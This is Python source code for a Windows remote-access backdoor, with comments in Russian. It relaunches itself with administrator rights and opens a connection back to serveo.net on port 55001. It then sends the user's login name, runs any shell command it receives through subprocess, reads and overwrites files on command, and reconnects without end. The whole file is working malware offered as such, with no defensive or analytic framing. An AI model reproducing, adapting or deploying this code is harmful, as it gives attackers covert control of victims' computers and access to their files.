import requests
import subprocess
import socket
import os
import time
import ctypes
import sys


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin():
    try:
        if is_admin():
            return  # Уже запущено с правами администратора

        # Запуск текущего скрипта с правами администратора
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(sys.argv), None, 0)
        except:
            print("Ошибка при попытке запустить с правами администратора")

    except Exception:
        pass


class backdoor:
    def __init__(self, REMOTE_HOST, REMOTE_PORT):
        self.REMOTE_HOST = REMOTE_HOST
        self.REMOTE_PORT = REMOTE_PORT

        count = 0

        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print("[-] Connection Initiating...")
                client.connect((self.REMOTE_HOST, self.REMOTE_PORT))
                print("[-] Connection initiated!")

                client.send(os.getlogin().encode('utf-8'))

                def read():
                    try:
                        read_file = command[5:].strip()
                        with open(read_file, 'r') as file_read:
                            lines = file_read.readlines()
                            client.send(str(len(lines)).encode('utf-8'))

                            for line in lines:
                                client.send(line.rstrip().encode('utf-8'))  # Удаление лишних символов новой строки
                                ack = client.recv(2)  # Ожидаем подтверждение от сервера
                                if ack != b'OK':
                                    break

                    except FileNotFoundError:
                        client.send(b"0")

                    except Exception as e:
                        client.send(b"0")

                def edit():
                    try:
                        edit_file = client.recv(131072).decode('utf-8')
                        file_length = int(client.recv(131072).decode('utf-8'))

                        with open(edit_file, 'w') as file:
                            for _ in range(file_length):
                                line = client.recv(131072).decode('utf-8')
                                file.write(line + '\n')
                                client.send(b'OK')  # Подтверждение получения строки
                    except Exception as e:
                        client.send(f'Error: {e}'.encode('utf-8'))

                def send_large_data(data):
                    length = len(data)
                    client.send(str(length).encode('utf-8'))
                    client.sendall(data)

                while True:
                    try:
                        try:
                            client.settimeout(10.0)
                            if client.recv(1024).decode() == 'Up':
                                print('Up')
                            else:
                                print('Unexpected syntax')
                                client.close()
                                break

                        except socket.timeout:
                            print('Time Out!')
                            client.close()
                            break
                        except Exception as Err:
                            print(Err)
                            client.close()
                            break

                        client.settimeout(None)
                        command = client.recv(131072).decode('utf-8', errors='replace')

                        if command.startswith('read'):
                            read()
                            client.send("Successful".encode('utf-8'))
                            continue

                        elif command == 'edit':
                            edit()
                            client.send("Successful".encode('utf-8'))
                            continue

                        elif command == 'reconnect':
                            client.send("reconnect".encode('utf-8'))
                            client.close()
                            time.sleep(5)
                            break

                        elif command == 'exit':
                            client.send("exit".encode('utf-8'))
                            client.close()
                            break

                        else:

                            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                            output = op.stdout.read() + op.stderr.read()
                            if output == b'':
                                client.send('No Output!'.encode())
                            else:
                                send_large_data(output)
                            #client.send(output)
                            print(output)



                    except Exception as e:
                        print(f"[!] An error occurred: {e}")
                        break




            except ConnectionRefusedError:
                # print("[!] Connection refused. Make sure the server is running.")
                time.sleep(3)
                break


            except Exception as e:
                # print(f"[!] An error occurred: {e}")
                time.sleep(3)
                break



if __name__ == "__main__":
    try:
        try:
            run_as_admin()
        except Exception:
            pass

        while True:
            REMOTE_HOST = 'serveo.net'
            REMOTE_PORT = 55001

            backdoor(REMOTE_HOST, REMOTE_PORT)
    except Exception:
        print("exit")
